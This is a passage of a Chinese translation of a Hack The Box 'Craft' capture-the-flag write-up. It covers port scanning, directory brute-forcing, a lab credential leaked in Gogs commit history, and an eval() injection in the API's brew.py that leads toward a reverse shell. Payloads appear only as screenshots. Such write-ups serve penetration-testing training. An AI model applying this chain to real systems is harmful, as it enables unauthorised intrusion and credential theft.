<html>
<head>
<title>HacktheBox — Craft</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子——工艺</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-craft-bf892b02fb90?source=collection_archive---------0-----------------------#2020-01-04">https://infosecwriteups.com/hackthebox-craft-bf892b02fb90?source=collection_archive---------0-----------------------#2020-01-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/e3f484bf6c039833c48869be2853df86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*ogThMFaPud7XMY60LMHOnA.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/197" rel="noopener ugc nofollow" target="_blank">https://www.hackthebox.eu/home/machines/profile/197</a></figcaption></figure><p id="f954" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这是一篇关于我如何从HacktheBox解决Craft的文章。</p><p id="a24b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><a class="ae jy" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="5f38" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">像往常一样，我试图解释我是如何从机器上理解这些概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。</p><h1 id="0a40" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">关于盒子:</h1><p id="fa47" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">Craft是我最喜欢的机器之一。它要求您正确地枚举，并在一个公开的Gogs存储库中“搜刮”,在那里您可以看到以前提交的凭证。深入存储库会导致应用程序的源代码暴露，Python eval可能会被滥用。这种初始访问会导致数据库连接脚本的修改，您可以编辑该脚本来转储凭据。以其中一个用户身份登录，然后您可以滥用名为Vault的secrets manager以root用户身份登录。</p><h1 id="8fdf" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">侦察:</h1><p id="aa5d" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">我首先通过调用以下命令运行nmap扫描:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e59d" class="mj ky iq mf b gy mk ml l mm mn">nmap -p- -oA nmap/allports-tcp 10.10.10.110</span></pre><p id="b5e2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">其结果是:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/8a547e358f60c6a02855a7631ae823c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:950/format:webp/1*prFZLNQtohcM2umeHMrBBQ.png"/></div></figure><p id="5ba9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我又进行了一次扫描:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="609a" class="mj ky iq mf b gy mk ml l mm mn">nmap -p 22,443,6022 -sV -sC -oA nmap/initial 10.10.10.110</span></pre><p id="104b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">其结果是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="18e3" class="mj ky iq mf b gy mk ml l mm mn">PORT     STATE SERVICE  VERSION<br/>22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)<br/>|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)<br/>|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)<br/>443/tcp  open  ssl/http nginx 1.15.8<br/>|_http-server-header: nginx/1.15.8<br/>|_http-title: About<br/>| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US<br/>| Not valid before: 2019-02-06T02:25:47<br/>|_Not valid after:  2020-06-20T02:25:47<br/>|_ssl-date: TLS randomness does not represent time<br/>| tls-alpn: <br/>|_  http/1.1<br/>| tls-nextprotoneg: <br/>|_  http/1.1<br/>6022/tcp open  ssh      (protocol 2.0)<br/>| fingerprint-strings: <br/>|   NULL: <br/>|_    SSH-2.0-Go<br/>| ssh-hostkey: <br/>|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)<br/>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a class="ae jy" href="https://nmap.org/cgi-bin/submit.cgi?new-service" rel="noopener ugc nofollow" target="_blank">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br/>SF-Port6022-TCP:V=7.80%I=7%D=1/3%Time=5E0FFEAF%P=x86_64-pc-linux-gnu%r(NUL<br/>SF:L,C,"SSH-2\.0-Go\r\n");<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="366b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">开放端口是22、443和6022。扫描给出了ssl-cert的信息，最有趣的是commonName字段。</p><p id="732d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我将它添加到我的/etc/hosts文件中:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="6794" class="mj ky iq mf b gy mk ml l mm mn">10.10.10.110    craft.htb</span></pre><p id="ab88" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">当我尝试访问443端口时:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/49bfa4f44d54e346fd765aeeda91d898.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*mICGZGMNRtnelLfU-wywKQ.png"/></div></figure><p id="6091" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我收到一个警告提示。这是因为Mozilla不知道机器使用的证书。这在HacktheBox机器中很常见。</p><h2 id="df1f" class="mj ky iq bd kz mq mr dn ld ms mt dp lh kk mu mv ll ko mw mx lp ks my mz lt na bi translated">其他工艺子域:</h2><p id="ded7" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">在craft.htb的登陆页面上，表明他们的存储库可以通过REST API访问。点击右上方的两个选项，它会把我们带到一个子域。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nb"><img src="../Images/95e3fc82c8c7255fcfe2ed15f14f8599.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*apm9duDpVEX-OOynLF8fDg.png"/></div></div></figure><p id="586a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">点击API，它导致的网址api.craft.htb/api/,，但它似乎无法加载该网站。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/26c3863f2fd0fa35dcc13137160c23ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*fzA3fmsrdAPdyT73g1yNAw.png"/></div></figure><p id="d21f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">点击API旁边的logo，导致gogs.craft.htb，同样失败。这是因为一个叫做虚拟主机的概念。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/3cb87a2bf118b23aff11de653fc70d7c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*U4Z2edM4ldGskBgykVRVHw.png"/></div></figure><p id="48ca" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我将子域添加到我的/etc/hosts中，这样它们就可以加载了。</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d1f5" class="mj ky iq mf b gy mk ml l mm mn">10.10.10.110    craft.htb api.craft.htb gogs.craft.htb</span></pre><h2 id="389f" class="mj ky iq bd kz mq mr dn ld ms mt dp lh kk mu mv ll ko mw mx lp ks my mz lt na bi translated">Craft API:</h2><p id="ee40" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">编辑完hosts文件后，我现在可以查看2个子域名了</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi ng"><img src="../Images/26f12f06f7ad61606a27b6e60f8ece71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_Pl48NHR32tcbBT_jL2QUA.png"/></div></div></figure><h2 id="1b15" class="mj ky iq bd kz mq mr dn ld ms mt dp lh kk mu mv ll ko mw mx lp ks my mz lt na bi translated">工艺眼镜:</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nh"><img src="../Images/7b5f086f5a8d45690f1c5a648f2b3299.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m9hP9-HufXjJ4stEtbizsg.png"/></div></div></figure><p id="76be" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我使用Gobuster在gogs子域上运行一个目录强制，因为Gogs是一个存储库:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="0974" class="mj ky iq mf b gy mk ml l mm mn">gobuster dir -u <a class="ae jy" href="https://gogs.craft.htb" rel="noopener ugc nofollow" target="_blank">https://gogs.craft.htb</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-gogs.out -k</span></pre><p id="1c2f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">在等待Gobuster结果的时候，我玩了玩Craft API。最有用的是check、login和brew。其不同的操作和各自的请求URL是:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="1794" class="mj ky iq mf b gy mk ml l mm mn">GET /auth/check<br/>Checks validity of an authorization token<br/>URL: https://api.craft.htb/api/auth/check</span><span id="75f8" class="mj ky iq mf b gy ni ml l mm mn">GET /auth/login<br/>Create an authentication token provided valid username and password<br/>URL: https://api.craft.htb/api/auth/login</span><span id="0a48" class="mj ky iq mf b gy ni ml l mm mn">POST /brew/<br/>Creates a new brew entry<br/>URL: https://api.craft.htb/api/brew/</span></pre><p id="05f0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查授权登录:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/2e973c54a06bc4311fb08527c4f97d31.png" data-original-src="https://miro.medium.com/v2/resize:fit:1188/format:webp/1*ZCss0enS-LqQMZyNrGRgUQ.png"/></div></figure><p id="ba42" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我使用了像admin:admin这样的基本凭证，但是不起作用，并得到如下的服务器响应:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/8e2eaa844c5a8bf9d1fe75a8c9fb45d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*1mKbVeHSJAy-l9OOyhUS2A.png"/></div></figure><p id="8016" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">最有可能的是，如果我有有效的凭证，它将生成一个授权令牌，我们可以使用/auth/check来验证它。Checking /brew，它需要一个授权令牌才能发布数据。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nk"><img src="../Images/7cf638403937e4c0d10d8a90c5ff289f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kwhGnMnDqS3FTnrAG5vHKw.png"/></div></div></figure><p id="eba0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">转到Gogs子域的Gobuster结果，我可以看到有一个管理员叶:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="782d" class="mj ky iq mf b gy mk ml l mm mn">/img (Status: 302)<br/>/admin (Status: 302)<br/>/assets (Status: 302)<br/>/issues (Status: 302)<br/>/plugins (Status: 302)<br/>/css (Status: 302)<br/>/avatars (Status: 302)<br/>/js (Status: 302)<br/>/explore (Status: 302)<br/>/administrator (Status: 200)<br/>/debug (Status: 200)<br/>/craft (Status: 200)<br/>/less (Status: 302)</span></pre><p id="5e84" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">访问者/管理员:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nl"><img src="../Images/3c6e8b04ba1aa2b919ecc8ba0c92ac3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1zQH5sytei7aik2O6ZHsXQ.png"/></div></div></figure><p id="9304" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查它的存储库，我可以看到craft-api:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nm"><img src="../Images/2020de001248f2c96834c4cf40802411.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Pr56rhogIzGInm1SMp5aoA.png"/></div></div></figure><p id="6e98" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后我检查了用户，发现4。他们是行政官，埃巴赫曼，迪内什，吉尔福伊尔。最后三个是《硅谷》系列中的角色。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nn"><img src="../Images/6f8b20bfc0ca72b03a5c40c35b23d26d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Oxpka69TjzolyuiuIna4Aw.png"/></div></div></figure><p id="a863" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查存储库，我可以看到许多源代码:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi no"><img src="../Images/5f749641a58231dc03225a39e98e94e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9CcVpUcYJr6EchA5N_Yfng.png"/></div></div></figure><p id="aa32" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查dbtest.py，这是一个数据库连接测试脚本，其中包括一个SQL查询来检查它是否工作。还要注意登录的详细信息来自哪里。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi np"><img src="../Images/1441722c96b9a830fe6636762a54d984.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*clKIszhr22IXTfvLk3nzzg.png"/></div></div></figure><p id="6fa8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查test.py，我可以从API子域中看到熟悉的URL。这里突出的是auth参数和头X-Craft-API-Token，它应该包含在内(使用有效的令牌),以便我与API的其他功能进行交互。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nq"><img src="../Images/393002b631e3aaf02a2930241fae6357.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oyuskWlvvqBFmIIPCcBjug.png"/></div></div></figure><p id="6d34" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">同时检查auth.py，它显示了授权中需要的内容:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nr"><img src="../Images/d1e3a1ed929f5e9e4b71d8aa42d5cafd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JiYE0_5j1AvJZ3GLaaNyVw.png"/></div></div></figure><p id="af9e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">auth.py如何工作的其他信息:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/af66e4cfb73bba56251ae9a11fc67ea5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1386/format:webp/1*Rt3NgU9xBj1gClx60WtDcg.png"/></div></figure><p id="8183" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">深入研究其他文件，brew.py的代码中有一行很有趣。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nt"><img src="../Images/4ef356303f232e19993bb16710cfe40f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*q2tarwQ2cjHg6t0Bpwb0BA.png"/></div></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/2e93b23afe23e84b8b759dc80fac1d72.png" data-original-src="https://miro.medium.com/v2/resize:fit:1140/format:webp/1*T6p2Ps3En45jukBFYoXg5g.png"/></div></figure><p id="fe32" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">该代码包括一个eval函数，它接受任何设置为abv的内容。还有一个评论是使用sane ABV值。查看这些问题，我看到了该评论的出处:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nv"><img src="../Images/61486a667b45acacf51cb12ddecddc19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IbzvDW5CzR0sfY0-e8dlAg.png"/></div></div></figure><p id="620e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">这是另一个提到头X-Craft-API-Token的地方。单击提交会导致以下结果:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nw"><img src="../Images/182ee58f5df838b182bc9932018ae7fd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQ0fHREpk9dziiONXdvwoA.png"/></div></div></figure><p id="b1cc" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">似乎修复包括了之前发现的eval函数。我可以尝试滥用eval函数，但是它要求我们有凭证来获取令牌。检查提交历史记录:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nx"><img src="../Images/1f90998f78b9f4ef2bc0c9c939fcb073.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QDkIj13C5Qa2OvbFy24bwg.png"/></div></div></figure><p id="aa10" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">检查commit add测试脚本(我也可以通过检查test.py的历史来看到这一点)，它公开了凭证:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi ny"><img src="../Images/6f85cdd3d293b9c06e4ce002fc3864d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wLgzYQIJKeYALWIJtSKsDQ.png"/></div></div></figure><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="a4d3" class="mj ky iq mf b gy mk ml l mm mn">dinesh:4aUh0A8PbVJxgd</span></pre><p id="5dff" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">提交清理测试删除了凭据。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi nz"><img src="../Images/1a97a08a030ae9964bccb6cc38ea4ff8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eg474qpzJPB_Bq7dbJ0S8w.png"/></div></div></figure><p id="f4dd" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">使用这些凭证，我可以以dinesh的身份登录Gogs:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi oa"><img src="../Images/d2171133bc45d810dbffabd60822e82e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SkldfOzbVYXQ2elVBu-SBA.png"/></div></div></figure><p id="b5d9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">使用相同的凭证，我可以对API进行身份验证:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/5ab41e386d9ab60dc65fa3288fb3f85b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*lzVuADUTOVHedaHd-MZxPQ.png"/></div></figure><p id="82f5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我得到了一个有效的令牌:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/4a8489b0d2e1d8d3f63b54072138c06b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*fQR5oCkcvFdnyReV6XZkpA.png"/></div></figure><p id="12c2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我检查auth login请求以查看其标题:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/f704e72f144ff0588920a5f01e49ea24.png" data-original-src="https://miro.medium.com/v2/resize:fit:934/format:webp/1*TfdQfLQ1DAYufkC9XKrg-A.png"/></div></figure><p id="7e13" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">它使用Basic作为其授权方法，基本上是用户名和密码的base64编码:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nc nd di ne bf nf"><div class="gh gi mp"><img src="../Images/d742ecc4ec778b6e3f6b16d7ec5f811f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*KOnD1w79hvTuXTNdul64TQ.png"/></div></div></figure><p id="e155" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">然后，我在请求/auth/check中包含了标题X-Craft-Api-Token:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/fee9808ab4b58d584632c5e7aeda456f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*pu6qdRFIcLDdqUc-Jtp8Yg.png"/></div></figure><p id="4f91" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">令牌有效。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/18e229858f0641888d7edae1d2bdb278.png" data-original-src="https://miro.medium.com/v2/resize:fit:554/format:webp/1*7Zv7YXBAJcWBRQ2lxHc6-A.png"/></div></figure><p id="8d2f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我现在有了获得令牌的方法，所以我现在可以使用/api/brew。注意，前面提到过(根据脚本), abv的值应该小于1。我尝试发布abv=1.1的值:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/f16bc36db46723ed65873650b86e11ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*_tlizI2j9M_1KF5k2HlhCA.png"/></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/557831792792ca814a6f545a30e11c47.png" data-original-src="https://miro.medium.com/v2/resize:fit:602/format:webp/1*MhjK0QJOfrLTvfVN9KzUJw.png"/></div></figure><p id="9547" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">不出所料。然后我发布了一个0.2的abv值:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/231394f4b6ed95c8e74cb7553197980b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*uZpusPzo7MGNzdIDrWByFA.png"/></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/fe9f4f27dd1e1cbd9b8510c710fc6c52.png" data-original-src="https://miro.medium.com/v2/resize:fit:522/format:webp/1*FPWP2NeXyw7xSkZ80H4usA.png"/></div></figure><p id="13ab" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">由于一切都按预期运行，我现在尝试使用eval函数。请记住，brew.py下有一行，它直接将abv的值传递给eval:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e64a" class="mj ky iq mf b gy mk ml l mm mn"># make sure the ABV value is sane.<br/>        if eval('%s &gt; 1' % request.json['abv']):<br/>            return "ABV must be a decimal value less than 1.0", 400<br/>        else:<br/>            create_brew(request.json)<br/>            return None, 201</span></pre><p id="4f85" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">我首先打开一个python2交互式shell来检查我如何误用它。我可以使用全局导入函数和它的方法。</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi of"><img src="../Images/01462f13417dcb4000c3494e9c99b06b.png" data-original-src="https://miro.medium.com/v2/resize:fit:768/format:webp/1*qSf70ltmDl--aa_MOOTYcg.png"/></div></figure><p id="76a1" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">看到它在本地工作，我现在在机器上试一试。我可以通过ping我的机器来验证代码的执行:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi og"><img src="../Images/53ec774e708f325487b123affa7ac16f.png" data-original-src="https://miro.medium.com/v2/resize:fit:852/format:webp/1*GwmiZzYKFGXn1i6uHfj6Rw.png"/></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/9327cc27e481abf665c465727f42f182.png" data-original-src="https://miro.medium.com/v2/resize:fit:1248/format:webp/1*_DdICwHsaRJZcToEXwTLkQ.png"/></div></figure><p id="6893" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">因为我可以从craft.htb获得pings，所以我现在设置我的监听器来捕获一个反向shell:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/03064099725f184c7cae4d4299fdaf7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:820/format:webp/1*fhEkaXsnxv5Bkd_Aei_sOg.png"/></div></figure><p id="68b2" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi 